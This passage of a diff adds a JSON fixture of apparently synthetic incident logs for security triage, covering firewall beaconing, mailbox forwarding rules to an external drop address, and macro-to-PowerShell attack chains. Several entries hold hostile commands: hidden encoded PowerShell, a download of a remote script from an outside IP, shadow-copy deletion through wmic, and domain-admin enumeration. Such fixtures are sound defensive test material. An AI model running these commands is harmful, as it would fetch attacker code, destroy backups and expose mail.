+      "timestamp=2026-05-13T11:25:36.000Z event_type=cloud_action user=unknown.user operation=ConditionalAccessPolicy.Disable source_ip=10.4.5.114 result=Success",
+      "timestamp=2026-05-13T11:25:54.000Z event_type=cloud_action user=unknown.user operation=KeyVault.Secret.Read source_ip=10.4.5.114 result=Success"
+    ],
+    "asset": {
+      "hostname": "kv-prod-secrets",
+      "ip": "10.4.5.114",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T11:23:00Z",
+      "riskScore": "medium",
+      "openVulnerabilities": 7
+    }
+  },
+  "INC-2026-0524": {
+    "logs": [
+      "timestamp=2026-05-12T22:10:20.000Z event_type=firewall source_ip=10.4.5.114 source_host=nsg-prod-web destination_ip=185.220.101.42 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1024 bytes_in=8192",
+      "timestamp=2026-05-12T22:10:40.000Z event_type=firewall source_ip=10.4.5.114 source_host=nsg-prod-web destination_ip=185.220.101.47 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1115 bytes_in=8204",
+      "timestamp=2026-05-12T22:11:00.000Z event_type=firewall source_ip=10.4.5.114 source_host=nsg-prod-web destination_ip=45.83.193.150 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1206 bytes_in=8216",
+      "timestamp=2026-05-12T22:11:20.000Z event_type=firewall source_ip=10.4.5.114 source_host=nsg-prod-web destination_ip=185.220.101.42 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1297 bytes_in=8228",
+      "timestamp=2026-05-12T22:11:40.000Z event_type=firewall source_ip=10.4.5.114 source_host=nsg-prod-web destination_ip=185.220.101.47 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1388 bytes_in=8240",
+      "timestamp=2026-05-12T22:12:00.000Z event_type=firewall source_ip=10.4.5.114 source_host=nsg-prod-web destination_ip=45.83.193.150 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1479 bytes_in=8252",
+      "timestamp=2026-05-12T22:12:20.000Z event_type=firewall source_ip=10.4.5.114 source_host=nsg-prod-web destination_ip=185.220.101.42 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1570 bytes_in=8264",
+      "timestamp=2026-05-12T22:12:40.000Z event_type=firewall source_ip=10.4.5.114 source_host=nsg-prod-web destination_ip=185.220.101.47 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1661 bytes_in=8276",
+      "timestamp=2026-05-12T22:13:00.000Z event_type=firewall source_ip=10.4.5.114 source_host=nsg-prod-web destination_ip=45.83.193.150 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1752 bytes_in=8288",
+      "timestamp=2026-05-12T22:13:20.000Z event_type=firewall source_ip=10.4.5.114 source_host=nsg-prod-web destination_ip=185.220.101.42 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1843 bytes_in=8300",
+      "timestamp=2026-05-12T22:13:40.000Z event_type=firewall source_ip=10.4.5.114 source_host=nsg-prod-web destination_ip=185.220.101.47 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1934 bytes_in=8312",
+      "timestamp=2026-05-12T22:14:00.000Z event_type=firewall source_ip=10.4.5.114 source_host=nsg-prod-web destination_ip=45.83.193.150 destination_port=53 protocol=TCP action=ALLOWED bytes_out=2025 bytes_in=8324",
+      "timestamp=2026-05-12T22:14:20.000Z event_type=firewall source_ip=10.4.5.114 source_host=nsg-prod-web destination_ip=185.220.101.42 destination_port=443 protocol=TCP action=ALLOWED bytes_out=2116 bytes_in=8336",
+      "timestamp=2026-05-12T22:14:40.000Z event_type=firewall source_ip=10.4.5.114 source_host=nsg-prod-web destination_ip=185.220.101.47 destination_port=53 protocol=TCP action=BLOCKED bytes_out=2207 bytes_in=8348"
+    ],
+    "asset": {
+      "hostname": "nsg-prod-web",
+      "ip": "10.4.5.114",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-12T22:12:00Z",
+      "riskScore": "medium",
+      "openVulnerabilities": 7
+    }
+  },
+  "INC-2026-0525": {
+    "logs": [
+      "timestamp=2026-05-13T04:18:30.000Z event_type=process asset=vm-build-runner-04 process_name=OUTLOOK.EXE command_line=\"outlook /attach Invoice-Q2.docm\" user=unknown.user parent_process=explorer.exe",
+      "timestamp=2026-05-13T04:18:42.000Z event_type=process asset=vm-build-runner-04 process_name=WINWORD.EXE command_line=\"WINWORD.EXE Invoice-Q2.docm\" user=unknown.user parent_process=OUTLOOK.EXE",
+      "timestamp=2026-05-13T04:18:54.000Z event_type=process asset=vm-build-runner-04 process_name=powershell.exe command_line=\"powershell.exe -nop -w hidden -enc SUVYIChOZXctT2JqZ...\" user=unknown.user parent_process=WINWORD.EXE",
+      "timestamp=2026-05-13T04:19:06.000Z event_type=process asset=vm-build-runner-04 process_name=powershell.exe command_line=\"Invoke-WebRequest http://185.220.101.47/p.ps1\" user=unknown.user parent_process=powershell.exe",
+      "timestamp=2026-05-13T04:19:18.000Z event_type=process asset=vm-build-runner-04 process_name=svchost.exe command_line=C:\\Users\\Public\\svchost.exe user=unknown.user parent_process=powershell.exe",
+      "timestamp=2026-05-13T04:19:30.000Z event_type=process asset=vm-build-runner-04 process_name=nmap.exe command_line=\"nmap -sS -p 22,80,135,139,389,443,445 10.0.2.0/24\" user=unknown.user parent_process=svchost.exe",
+      "timestamp=2026-05-13T04:19:42.000Z event_type=process asset=vm-build-runner-04 process_name=wmic.exe command_line=\"wmic /node:FILE-SRV-001 process call create \"cmd.exe /c vssadmin delete shadows\"\" user=unknown.user parent_process=nmap.exe",
+      "timestamp=2026-05-13T04:19:54.000Z event_type=process asset=vm-build-runner-04 process_name=vssadmin.exe command_line=\"vssadmin delete shadows /all /quiet\" user=unknown.user parent_process=wmic.exe",
+      "timestamp=2026-05-13T04:20:06.000Z event_type=process asset=vm-build-runner-04 process_name=whoami.exe command_line=\"whoami /all\" user=unknown.user parent_process=vssadmin.exe",
+      "timestamp=2026-05-13T04:20:18.000Z event_type=process asset=vm-build-runner-04 process_name=net.exe command_line=\"net group \"Domain Admins\" /domain\" user=unknown.user parent_process=whoami.exe",
+      "timestamp=2026-05-13T04:20:30.000Z event_type=network asset=vm-build-runner-04 source_ip=10.4.5.114 destination_ip=185.220.101.47 destination_port=443 action=ALLOWED bytes=12482 process=svchost.exe"
+    ],
+    "asset": {
+      "hostname": "vm-build-runner-04",
+      "ip": "10.4.5.114",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T04:19:00Z",
+      "riskScore": "medium",
+      "openVulnerabilities": 7
+    }
+  },
+  "INC-2026-0526": {
+    "logs": [
+      "timestamp=2026-05-13T09:42:00.000Z event_type=mailbox_access mailbox=ap@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false items_accessed=142",
+      "timestamp=2026-05-13T09:42:32.000Z event_type=mailbox_access mailbox=ar@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false items_accessed=143",
+      "timestamp=2026-05-13T09:43:04.000Z event_type=mailbox_access mailbox=payroll@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false items_accessed=144",
+      "timestamp=2026-05-13T09:43:36.000Z event_type=mailbox_access mailbox=controller@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false items_accessed=145",
+      "timestamp=2026-05-13T09:44:08.000Z event_type=mailbox_access mailbox=ap@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false items_accessed=146",
+      "timestamp=2026-05-13T09:44:40.000Z event_type=mailbox_access mailbox=ar@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false items_accessed=147",
+      "timestamp=2026-05-13T09:45:12.000Z event_type=inbox_rule_created mailbox=payroll@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false forward_to=exfil-drop@protonmail.com",
+      "timestamp=2026-05-13T09:45:44.000Z event_type=inbox_rule_created mailbox=controller@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false forward_to=exfil-drop@protonmail.com",
+      "timestamp=2026-05-13T09:46:16.000Z event_type=inbox_rule_created mailbox=ap@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false forward_to=exfil-drop@protonmail.com",
+      "timestamp=2026-05-13T09:46:48.000Z event_type=oauth_token_issued mailbox=ar@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false",
+      "timestamp=2026-05-13T09:47:20.000Z event_type=oauth_token_issued mailbox=payroll@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false",
+      "timestamp=2026-05-13T09:47:52.000Z event_type=oauth_token_issued mailbox=controller@contoso.com source_ip=10.4.5.114 tor_exit_node=false mfa_used=false"
+    ],
+    "asset": {
+      "hostname": "UNKNOWN-HOST",
+      "ip": "10.4.5.114",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T09:42:00Z",
+      "riskScore": "medium",
+      "openVulnerabilities": 7
+    }
+  },
+  "INC-2026-0527": {
+    "logs": [
+      "timestamp=2026-05-13T10:14:20.000Z event_type=firewall source_ip=10.4.5.114 source_host=10.4.5.114 destination_ip=185.220.101.42 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1024 bytes_in=8192",
+      "timestamp=2026-05-13T10:14:40.000Z event_type=firewall source_ip=10.4.5.114 source_host=10.4.5.114 destination_ip=185.220.101.47 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1115 bytes_in=8204",
+      "timestamp=2026-05-13T10:15:00.000Z event_type=firewall source_ip=10.4.5.114 source_host=10.4.5.114 destination_ip=45.83.193.150 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1206 bytes_in=8216",
+      "timestamp=2026-05-13T10:15:20.000Z event_type=firewall source_ip=10.4.5.114 source_host=10.4.5.114 destination_ip=185.220.101.42 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1297 bytes_in=8228",
+      "timestamp=2026-05-13T10:15:40.000Z event_type=firewall source_ip=10.4.5.114 source_host=10.4.5.114 destination_ip=185.220.101.47 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1388 bytes_in=8240",
+      "timestamp=2026-05-13T10:16:00.000Z event_type=firewall source_ip=10.4.5.114 source_host=10.4.5.114 destination_ip=45.83.193.150 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1479 bytes_in=8252",
+      "timestamp=2026-05-13T10:16:20.000Z event_type=firewall source_ip=10.4.5.114 source_host=10.4.5.114 destination_ip=185.220.101.42 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1570 bytes_in=8264",
+      "timestamp=2026-05-13T10:16:40.000Z event_type=firewall source_ip=10.4.5.114 source_host=10.4.5.114 destination_ip=185.220.101.47 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1661 bytes_in=8276",
+      "timestamp=2026-05-13T10:17:00.000Z event_type=firewall source_ip=10.4.5.114 source_host=10.4.5.114 destination_ip=45.83.193.150 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1752 bytes_in=8288",
+      "timestamp=2026-05-13T10:17:20.000Z event_type=firewall source_ip=10.4.5.114 source_host=10.4.5.114 destination_ip=185.220.101.42 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1843 bytes_in=8300",
+      "timestamp=2026-05-13T10:17:40.000Z event_type=firewall source_ip=10.4.5.114 source_host=10.4.5.114 destination_ip=185.220.101.47 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1934 bytes_in=8312",
+      "timestamp=2026-05-13T10:18:00.000Z event_type=firewall source_ip=10.4.5.114 source_host=10.4.5.114 destination_ip=45.83.193.150 destination_port=53 protocol=TCP action=ALLOWED bytes_out=2025 bytes_in=8324",
+      "timestamp=2026-05-13T10:18:20.000Z event_type=firewall source_ip=10.4.5.114 source_host=10.4.5.114 destination_ip=185.220.101.42 destination_port=443 protocol=TCP action=ALLOWED bytes_out=2116 bytes_in=8336",
+      "timestamp=2026-05-13T10:18:40.000Z event_type=firewall source_ip=10.4.5.114 source_host=10.4.5.114 destination_ip=185.220.101.47 destination_port=53 protocol=TCP action=BLOCKED bytes_out=2207 bytes_in=8348"
+    ],
+    "asset": {
+      "hostname": "10.4.5.114",
+      "ip": "10.4.5.114",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T10:16:00Z",
+      "riskScore": "high",
+      "openVulnerabilities": 24
+    }
+  },
+  "INC-2026-0528": {
+    "logs": [
+      "timestamp=2026-05-13T10:23:20.000Z event_type=firewall source_ip=10.4.5.114 source_host=WS-FIN-014 destination_ip=185.220.101.42 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1024 bytes_in=8192",
+      "timestamp=2026-05-13T10:23:40.000Z event_type=firewall source_ip=10.4.5.114 source_host=WS-FIN-014 destination_ip=185.220.101.47 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1115 bytes_in=8204",
+      "timestamp=2026-05-13T10:24:00.000Z event_type=firewall source_ip=10.4.5.114 source_host=WS-FIN-014 destination_ip=45.83.193.150 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1206 bytes_in=8216",
+      "timestamp=2026-05-13T10:24:20.000Z event_type=firewall source_ip=10.4.5.114 source_host=WS-FIN-014 destination_ip=185.220.101.42 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1297 bytes_in=8228",
+      "timestamp=2026-05-13T10:24:40.000Z event_type=firewall source_ip=10.4.5.114 source_host=WS-FIN-014 destination_ip=185.220.101.47 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1388 bytes_in=8240",
+      "timestamp=2026-05-13T10:25:00.000Z event_type=firewall source_ip=10.4.5.114 source_host=WS-FIN-014 destination_ip=45.83.193.150 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1479 bytes_in=8252",
+      "timestamp=2026-05-13T10:25:20.000Z event_type=firewall source_ip=10.4.5.114 source_host=WS-FIN-014 destination_ip=185.220.101.42 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1570 bytes_in=8264",
+      "timestamp=2026-05-13T10:25:40.000Z event_type=firewall source_ip=10.4.5.114 source_host=WS-FIN-014 destination_ip=185.220.101.47 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1661 bytes_in=8276",
+      "timestamp=2026-05-13T10:26:00.000Z event_type=firewall source_ip=10.4.5.114 source_host=WS-FIN-014 destination_ip=45.83.193.150 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1752 bytes_in=8288",
+      "timestamp=2026-05-13T10:26:20.000Z event_type=firewall source_ip=10.4.5.114 source_host=WS-FIN-014 destination_ip=185.220.101.42 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1843 bytes_in=8300",
+      "timestamp=2026-05-13T10:26:40.000Z event_type=firewall source_ip=10.4.5.114 source_host=WS-FIN-014 destination_ip=185.220.101.47 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1934 bytes_in=8312",
+      "timestamp=2026-05-13T10:27:00.000Z event_type=firewall source_ip=10.4.5.114 source_host=WS-FIN-014 destination_ip=45.83.193.150 destination_port=53 protocol=TCP action=ALLOWED bytes_out=2025 bytes_in=8324",
+      "timestamp=2026-05-13T10:27:20.000Z event_type=firewall source_ip=10.4.5.114 source_host=WS-FIN-014 destination_ip=185.220.101.42 destination_port=443 protocol=TCP action=ALLOWED bytes_out=2116 bytes_in=8336",
+      "timestamp=2026-05-13T10:27:40.000Z event_type=firewall source_ip=10.4.5.114 source_host=WS-FIN-014 destination_ip=185.220.101.47 destination_port=53 protocol=TCP action=BLOCKED bytes_out=2207 bytes_in=8348"
+    ],
+    "asset": {
+      "hostname": "WS-FIN-014",
+      "ip": "10.4.5.114",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T10:25:00Z",
+      "riskScore": "high",
+      "openVulnerabilities": 24
+    }
+  },
+  "INC-2026-0529": {
+    "logs": [
+      "timestamp=2026-05-13T12:58:20.000Z event_type=firewall source_ip=10.4.5.114 source_host=10.4.5.114 destination_ip=185.220.101.42 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1024 bytes_in=8192",
+      "timestamp=2026-05-13T12:58:40.000Z event_type=firewall source_ip=10.4.5.114 source_host=10.4.5.114 destination_ip=185.220.101.47 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1115 bytes_in=8204",
+      "timestamp=2026-05-13T12:59:00.000Z event_type=firewall source_ip=10.4.5.114 source_host=10.4.5.114 destination_ip=45.83.193.150 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1206 bytes_in=8216",
+      "timestamp=2026-05-13T12:59:20.000Z event_type=firewall source_ip=10.4.5.114 source_host=10.4.5.114 destination_ip=185.220.101.42 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1297 bytes_in=8228",
+      "timestamp=2026-05-13T12:59:40.000Z event_type=firewall source_ip=10.4.5.114 source_host=10.4.5.114 destination_ip=185.220.101.47 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1388 bytes_in=8240",
+      "timestamp=2026-05-13T13:00:00.000Z event_type=firewall source_ip=10.4.5.114 source_host=10.4.5.114 destination_ip=45.83.193.150 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1479 bytes_in=8252",
+      "timestamp=2026-05-13T13:00:20.000Z event_type=firewall source_ip=10.4.5.114 source_host=10.4.5.114 destination_ip=185.220.101.42 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1570 bytes_in=8264",
+      "timestamp=2026-05-13T13:00:40.000Z event_type=firewall source_ip=10.4.5.114 source_host=10.4.5.114 destination_ip=185.220.101.47 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1661 bytes_in=8276",
+      "timestamp=2026-05-13T13:01:00.000Z event_type=firewall source_ip=10.4.5.114 source_host=10.4.5.114 destination_ip=45.83.193.150 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1752 bytes_in=8288",
+      "timestamp=2026-05-13T13:01:20.000Z event_type=firewall source_ip=10.4.5.114 source_host=10.4.5.114 destination_ip=185.220.101.42 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1843 bytes_in=8300",
+      "timestamp=2026-05-13T13:01:40.000Z event_type=firewall source_ip=10.4.5.114 source_host=10.4.5.114 destination_ip=185.220.101.47 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1934 bytes_in=8312",
+      "timestamp=2026-05-13T13:02:00.000Z event_type=firewall source_ip=10.4.5.114 source_host=10.4.5.114 destination_ip=45.83.193.150 destination_port=53 protocol=TCP action=ALLOWED bytes_out=2025 bytes_in=8324",
+      "timestamp=2026-05-13T13:02:20.000Z event_type=firewall source_ip=10.4.5.114 source_host=10.4.5.114 destination_ip=185.220.101.42 destination_port=443 protocol=TCP action=ALLOWED bytes_out=2116 bytes_in=8336",
+      "timestamp=2026-05-13T13:02:40.000Z event_type=firewall source_ip=10.4.5.114 source_host=10.4.5.114 destination_ip=185.220.101.47 destination_port=53 protocol=TCP action=BLOCKED bytes_out=2207 bytes_in=8348"
+    ],
+    "asset": {
+      "hostname": "10.4.5.114",
+      "ip": "10.4.5.114",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T13:00:00Z",
+      "riskScore": "medium",
+      "openVulnerabilities": 7
+    }
+  },
+  "INC-2026-0530": {
+    "logs": [
+      "timestamp=2026-05-13T07:54:20.000Z event_type=firewall source_ip=10.4.5.114 source_host=WS-DEV-031 destination_ip=185.220.101.42 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1024 bytes_in=8192",
+      "timestamp=2026-05-13T07:54:40.000Z event_type=firewall source_ip=10.4.5.114 source_host=WS-DEV-031 destination_ip=185.220.101.47 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1115 bytes_in=8204",
+      "timestamp=2026-05-13T07:55:00.000Z event_type=firewall source_ip=10.4.5.114 source_host=WS-DEV-031 destination_ip=45.83.193.150 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1206 bytes_in=8216",
+      "timestamp=2026-05-13T07:55:20.000Z event_type=firewall source_ip=10.4.5.114 source_host=WS-DEV-031 destination_ip=185.220.101.42 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1297 bytes_in=8228",
+      "timestamp=2026-05-13T07:55:40.000Z event_type=firewall source_ip=10.4.5.114 source_host=WS-DEV-031 destination_ip=185.220.101.47 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1388 bytes_in=8240",
+      "timestamp=2026-05-13T07:56:00.000Z event_type=firewall source_ip=10.4.5.114 source_host=WS-DEV-031 destination_ip=45.83.193.150 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1479 bytes_in=8252",
+      "timestamp=2026-05-13T07:56:20.000Z event_type=firewall source_ip=10.4.5.114 source_host=WS-DEV-031 destination_ip=185.220.101.42 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1570 bytes_in=8264",
+      "timestamp=2026-05-13T07:56:40.000Z event_type=firewall source_ip=10.4.5.114 source_host=WS-DEV-031 destination_ip=185.220.101.47 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1661 bytes_in=8276",
+      "timestamp=2026-05-13T07:57:00.000Z event_type=firewall source_ip=10.4.5.114 source_host=WS-DEV-031 destination_ip=45.83.193.150 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1752 bytes_in=8288",
+      "timestamp=2026-05-13T07:57:20.000Z event_type=firewall source_ip=10.4.5.114 source_host=WS-DEV-031 destination_ip=185.220.101.42 destination_port=53 protocol=TCP action=ALLOWED bytes_out=1843 bytes_in=8300",
+      "timestamp=2026-05-13T07:57:40.000Z event_type=firewall source_ip=10.4.5.114 source_host=WS-DEV-031 destination_ip=185.220.101.47 destination_port=443 protocol=TCP action=ALLOWED bytes_out=1934 bytes_in=8312",
+      "timestamp=2026-05-13T07:58:00.000Z event_type=firewall source_ip=10.4.5.114 source_host=WS-DEV-031 destination_ip=45.83.193.150 destination_port=53 protocol=TCP action=ALLOWED bytes_out=2025 bytes_in=8324",
+      "timestamp=2026-05-13T07:58:20.000Z event_type=firewall source_ip=10.4.5.114 source_host=WS-DEV-031 destination_ip=185.220.101.42 destination_port=443 protocol=TCP action=ALLOWED bytes_out=2116 bytes_in=8336",
+      "timestamp=2026-05-13T07:58:40.000Z event_type=firewall source_ip=10.4.5.114 source_host=WS-DEV-031 destination_ip=185.220.101.47 destination_port=53 protocol=TCP action=BLOCKED bytes_out=2207 bytes_in=8348"
+    ],
+    "asset": {
+      "hostname": "WS-DEV-031",
+      "ip": "10.4.5.114",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T07:56:00Z",
+      "riskScore": "medium",
+      "openVulnerabilities": 7
+    }
+  },
+  "INC-2026-0531": {
+    "logs": [
+      "timestamp=2026-05-13T14:06:52.000Z event_type=process asset=WIN10-WS-047 process_name=OUTLOOK.EXE command_line=\"outlook /attach Invoice-Q2.docm\" user=jamie.chen@contoso.com parent_process=explorer.exe",
+      "timestamp=2026-05-13T14:07:04.000Z event_type=process asset=WIN10-WS-047 process_name=WINWORD.EXE command_line=\"WINWORD.EXE Invoice-Q2.docm\" user=jamie.chen@contoso.com parent_process=OUTLOOK.EXE",
+      "timestamp=2026-05-13T14:07:16.000Z event_type=process asset=WIN10-WS-047 process_name=powershell.exe command_line=\"powershell.exe -nop -w hidden -enc SUVYIChOZXctT2JqZ...\" user=jamie.chen@contoso.com parent_process=WINWORD.EXE",
+      "timestamp=2026-05-13T14:07:28.000Z event_type=process asset=WIN10-WS-047 process_name=powershell.exe command_line=\"Invoke-WebRequest http://185.220.101.47/p.ps1\" user=jamie.chen@contoso.com parent_process=powershell.exe",
+      "timestamp=2026-05-13T14:07:40.000Z event_type=process asset=WIN10-WS-047 process_name=svchost.exe command_line=C:\\Users\\Public\\svchost.exe user=jamie.chen@contoso.com parent_process=powershell.exe",
+      "timestamp=2026-05-13T14:07:52.000Z event_type=process asset=WIN10-WS-047 process_name=nmap.exe command_line=\"nmap -sS -p 22,80,135,139,389,443,445 10.0.2.0/24\" user=jamie.chen@contoso.com parent_process=svchost.exe",
+      "timestamp=2026-05-13T14:08:04.000Z event_type=process asset=WIN10-WS-047 process_name=wmic.exe command_line=\"wmic /node:FILE-SRV-001 process call create \"cmd.exe /c vssadmin delete shadows\"\" user=jamie.chen@contoso.com parent_process=nmap.exe",
+      "timestamp=2026-05-13T14:08:16.000Z event_type=process asset=WIN10-WS-047 process_name=vssadmin.exe command_line=\"vssadmin delete shadows /all /quiet\" user=jamie.chen@contoso.com parent_process=wmic.exe",
+      "timestamp=2026-05-13T14:08:28.000Z event_type=process asset=WIN10-WS-047 process_name=whoami.exe command_line=\"whoami /all\" user=jamie.chen@contoso.com parent_process=vssadmin.exe",
+      "timestamp=2026-05-13T14:08:40.000Z event_type=process asset=WIN10-WS-047 process_name=net.exe command_line=\"net group \"Domain Admins\" /domain\" user=jamie.chen@contoso.com parent_process=whoami.exe",
+      "timestamp=2026-05-13T14:08:52.000Z event_type=network asset=WIN10-WS-047 source_ip=185.220.101.47 destination_ip=185.220.101.47 destination_port=443 action=ALLOWED bytes=12482 process=svchost.exe"
+    ],
+    "asset": {
+      "hostname": "WIN10-WS-047",
+      "ip": "185.220.101.47",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T14:07:22Z",
+      "riskScore": "high",
+      "openVulnerabilities": 24
+    }
+  },
+  "INC-2026-0532": {
+    "logs": [
+      "timestamp=2026-05-13T09:22:11.000Z event_type=mailbox_access mailbox=ap@contoso.com source_ip=185.220.101.47 tor_exit_node=true mfa_used=false items_accessed=142",
+      "timestamp=2026-05-13T09:22:43.000Z event_type=mailbox_access mailbox=ar@contoso.com source_ip=185.220.101.47 tor_exit_node=true mfa_used=false items_accessed=143",
+      "timestamp=2026-05-13T09:23:15.000Z event_type=mailbox_access mailbox=payroll@contoso.com source_ip=185.220.101.47 tor_exit_node=true mfa_used=false items_accessed=144",
+      "timestamp=2026-05-13T09:23:47.000Z event_type=mailbox_access mailbox=controller@contoso.com source_ip=185.220.101.47 tor_exit_node=true mfa_used=false items_accessed=145",
+      "timestamp=2026-05-13T09:24:19.000Z event_type=mailbox_access mailbox=ap@contoso.com source_ip=185.220.101.47 tor_exit_node=true mfa_used=false items_accessed=146",
+      "timestamp=2026-05-13T09:24:51.000Z event_type=mailbox_access mailbox=ar@contoso.com source_ip=185.220.101.47 tor_exit_node=true mfa_used=false items_accessed=147",
+      "timestamp=2026-05-13T09:25:23.000Z event_type=inbox_rule_created mailbox=payroll@contoso.com source_ip=185.220.101.47 tor_exit_node=true mfa_used=false forward_to=exfil-drop@protonmail.com",
+      "timestamp=2026-05-13T09:25:55.000Z event_type=inbox_rule_created mailbox=controller@contoso.com source_ip=185.220.101.47 tor_exit_node=true mfa_used=false forward_to=exfil-drop@protonmail.com",
+      "timestamp=2026-05-13T09:26:27.000Z event_type=inbox_rule_created mailbox=ap@contoso.com source_ip=185.220.101.47 tor_exit_node=true mfa_used=false forward_to=exfil-drop@protonmail.com",
+      "timestamp=2026-05-13T09:26:59.000Z event_type=oauth_token_issued mailbox=ar@contoso.com source_ip=185.220.101.47 tor_exit_node=true mfa_used=false",
+      "timestamp=2026-05-13T09:27:31.000Z event_type=oauth_token_issued mailbox=payroll@contoso.com source_ip=185.220.101.47 tor_exit_node=true mfa_used=false",
+      "timestamp=2026-05-13T09:28:03.000Z event_type=oauth_token_issued mailbox=controller@contoso.com source_ip=185.220.101.47 tor_exit_node=true mfa_used=false"
+    ],
+    "asset": {
+      "hostname": "UNKNOWN-HOST",
+      "ip": "185.220.101.47",
+      "os": "Windows 10 22H2",
+      "lastSeen": "2026-05-13T09:22:11Z",
+      "riskScore": "medium",
+      "openVulnerabilities": 7
+    }
+  },
+  "INC-2026-0533": {
+    "logs": [
+      "timestamp=2026-05-13T14:30:35.000Z event_type=process asset=WIN10-WS-047 process_name=OUTLOOK.EXE command_line=\"outlook /attach Invoice-Q2.docm\" user=unknown.user parent_process=explorer.exe",
+      "timestamp=2026-05-13T14:30:47.000Z event_type=process asset=WIN10-WS-047 process_name=WINWORD.EXE command_line=\"WINWORD.EXE Invoice-Q2.docm\" user=unknown.user parent_process=OUTLOOK.EXE",
+      "timestamp=2026-05-13T14:30:59.000Z event_type=process asset=WIN10-WS-047 process_name=powershell.exe command_line=\"powershell.exe -nop -w hidden -enc SUVYIChOZXctT2JqZ...\" user=unknown.user parent_process=WINWORD.EXE",
+      "timestamp=2026-05-13T14:31:11.000Z event_type=process asset=WIN10-WS-047 process_name=powershell.exe command_line=\"Invoke-WebRequest http://185.220.101.47/p.ps1\" user=unknown.user parent_process=powershell.exe",
+      "timestamp=2026-05-13T14:31:23.000Z event_type=process asset=WIN10-WS-047 process_name=svchost.exe command_line=C:\\Users\\Public\\svchost.exe user=unknown.user parent_process=powershell.exe",
+      "timestamp=2026-05-13T14:31:35.000Z event_type=process asset=WIN10-WS-047 process_name=nmap.exe command_line=\"nmap -sS -p 22,80,135,139,389,443,445 10.0.2.0/24\" user=unknown.user parent_process=svchost.exe",
+      "timestamp=2026-05-13T14:31:47.000Z event_type=process asset=WIN10-WS-047 process_name=wmic.exe command_line=\"wmic /node:FILE-SRV-001 process call create \"cmd.exe /c vssadmin delete shadows\"\" user=unknown.user parent_process=nmap.exe",
+      "timestamp=2026-05-13T14:31:59.000Z event_type=process asset=WIN10-WS-047 process_name=vssadmin.exe command_line=\"vssadmin delete shadows /all /quiet\" user=unknown.user parent_process=wmic.exe",
+      "timestamp=2026-05-13T14:32:11.000Z event_type=process asset=WIN10-WS-047 process_name=whoami.exe command_line=\"whoami /all\" user=unknown.user parent_process=vssadmin.exe",
+      "timestamp=2026-05-13T14:32:23.000Z event_type=process asset=WIN10-WS-047 process_name=net.exe command_line=\"net group \"Domain Admins\" /domain\" user=unknown.user parent_process=whoami.exe",
